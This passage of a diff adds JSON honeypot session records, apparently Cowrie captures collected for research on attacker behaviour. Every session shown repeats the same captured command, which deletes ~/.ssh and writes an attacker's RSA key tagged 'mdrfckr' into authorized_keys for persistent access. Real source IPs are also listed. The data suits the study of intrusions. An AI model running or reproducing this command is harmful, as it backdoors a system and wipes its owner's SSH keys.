+        "response_category": "success",
+        "inter_command_gap_s": 8.43,
+        "think_time_bin": "long",
+        "cumulative_time_s": 8.44,
+        "task_progress": 1.0
+      }
+    ]
+  },
+  {
+    "session_id": "WILD-00007",
+    "actor_label": "unknown",
+    "participant_id": null,
+    "task": "wild",
+    "split": "wild",
+    "evasion_strategy": "unknown",
+    "generator_family": "wild",
+    "total_steps": 3,
+    "session_duration_s": 0.34,
+    "data_source": "cowrie_wild",
+    "src_ip": "125.138.175.113",
+    "interactions": [
+      {
+        "step": 0,
+        "command": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.0,
+        "task_progress": 0.33
+      },
+      {
+        "step": 1,
+        "command": "lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "command_not_found",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.02,
+        "task_progress": 0.67
+      },
+      {
+        "step": 2,
+        "command": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.31,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.34,
+        "task_progress": 1.0
+      }
+    ]
+  },
+  {
+    "session_id": "WILD-00008",
+    "actor_label": "unknown",
+    "participant_id": null,
+    "task": "wild",
+    "split": "wild",
+    "evasion_strategy": "unknown",
+    "generator_family": "wild",
+    "total_steps": 3,
+    "session_duration_s": 0.33,
+    "data_source": "cowrie_wild",
+    "src_ip": "125.138.175.113",
+    "interactions": [
+      {
+        "step": 0,
+        "command": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.0,
+        "task_progress": 0.33
+      },
+      {
+        "step": 1,
+        "command": "lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "command_not_found",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.02,
+        "task_progress": 0.67
+      },
+      {
+        "step": 2,
+        "command": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.31,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.33,
+        "task_progress": 1.0
+      }
+    ]
+  },
+  {
+    "session_id": "WILD-00009",
+    "actor_label": "unknown",
+    "participant_id": null,
+    "task": "wild",
+    "split": "wild",
+    "evasion_strategy": "unknown",
+    "generator_family": "wild",
+    "total_steps": 3,
+    "session_duration_s": 0.53,
+    "data_source": "cowrie_wild",
+    "src_ip": "45.207.209.16",
+    "interactions": [
+      {
+        "step": 0,
+        "command": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.0,
+        "task_progress": 0.33
+      },
+      {
+        "step": 1,
+        "command": "lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "command_not_found",
+        "inter_command_gap_s": 0.01,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.01,
+        "task_progress": 0.67
+      },
+      {
+        "step": 2,
+        "command": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.52,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.53,
+        "task_progress": 1.0
+      }
+    ]
+  },
+  {
+    "session_id": "WILD-00010",
+    "actor_label": "unknown",
+    "participant_id": null,
+    "task": "wild",
+    "split": "wild",
+    "evasion_strategy": "unknown",
+    "generator_family": "wild",
+    "total_steps": 3,
+    "session_duration_s": 0.64,
+    "data_source": "cowrie_wild",
+    "src_ip": "45.207.209.16",
+    "interactions": [
+      {
+        "step": 0,
+        "command": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.0,
+        "task_progress": 0.33
+      },
+      {
+        "step": 1,
+        "command": "lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "command_not_found",
+        "inter_command_gap_s": 0.03,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.03,
+        "task_progress": 0.67
+      },
+      {
+        "step": 2,
+        "command": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.61,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.64,
+        "task_progress": 1.0
+      }
+    ]
+  },
+  {
+    "session_id": "WILD-00011",
+    "actor_label": "unknown",
+    "participant_id": null,
+    "task": "wild",
+    "split": "wild",
+    "evasion_strategy": "unknown",
+    "generator_family": "wild",
+    "total_steps": 3,
+    "session_duration_s": 0.92,
+    "data_source": "cowrie_wild",
+    "src_ip": "70.120.203.193",
+    "interactions": [
+      {
+        "step": 0,
+        "command": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.0,
+        "task_progress": 0.33
+      },
+      {
+        "step": 1,
+        "command": "lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "command_not_found",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.02,
+        "task_progress": 0.67
+      },
+      {
+        "step": 2,
+        "command": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.91,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.92,
+        "task_progress": 1.0
+      }
+    ]
+  },
+  {
+    "session_id": "WILD-00012",
+    "actor_label": "unknown",
+    "participant_id": null,
+    "task": "wild",
+    "split": "wild",
+    "evasion_strategy": "unknown",
+    "generator_family": "wild",
+    "total_steps": 3,
+    "session_duration_s": 1.03,
+    "data_source": "cowrie_wild",
+    "src_ip": "70.120.203.193",
+    "interactions": [
+      {
+        "step": 0,
+        "command": "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 0.0,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.0,
+        "task_progress": 0.33
+      },
+      {
+        "step": 1,
+        "command": "lockr -ia .ssh",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "command_not_found",
+        "inter_command_gap_s": 0.02,
+        "think_time_bin": "short",
+        "cumulative_time_s": 0.02,
+        "task_progress": 0.67
+      },
+      {
+        "step": 2,
+        "command": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+        "has_typo": false,
+        "system_response": "(wild data - no captured output)",
+        "response_category": "success",
+        "inter_command_gap_s": 1.01,
+        "think_time_bin": "short",
+        "cumulative_time_s": 1.03,
+        "task_progress": 1.0
+      }
+    ]
+  }
+]
